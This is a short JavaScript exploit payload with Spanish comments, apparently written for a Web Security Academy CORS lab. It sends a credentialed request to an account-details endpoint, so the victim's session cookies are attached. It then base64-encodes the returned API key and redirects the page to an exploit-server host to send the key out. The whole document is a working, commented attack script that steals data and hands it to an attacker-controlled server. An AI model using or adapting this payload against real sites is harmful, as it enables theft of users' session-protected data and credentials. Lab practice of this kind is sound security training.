<script>
    // 1. Instanciamos el objeto para realizar la petición asíncrona
    var req = new XMLHttpRequest();

    // 2. Definimos la función que se ejecutará cuando la respuesta sea exitosa
    req.onload = function() {
        // Exfiltramos la información (API Key) hacia nuestro servidor de control
        // Usamos btoa() para codificar en Base64 y evitar problemas con caracteres especiales en la URL
        location = "https://exploit-0aa000a0039d1754808d398f01cf00a1.exploit-server.net/?apikey=" + btoa(req.responseText);
    };

    // 3. Configuramos la petición hacia el endpoint vulnerable
    // Esta URL contiene información sensible (detalles de la cuenta)
    req.open("GET","https://0a65006f036117a580193a9e00d300ad.web-security-academy.net/accountDetails", true);

    // 4. CRÍTICO: Enviamos las cookies de sesión del usuario (Credentials)
    // Sin esto, no podríamos acceder a la información privada de la víctima
    req.withCredentials = true;

    // 5. Ejecutamos la petición
    req.send();
</script>
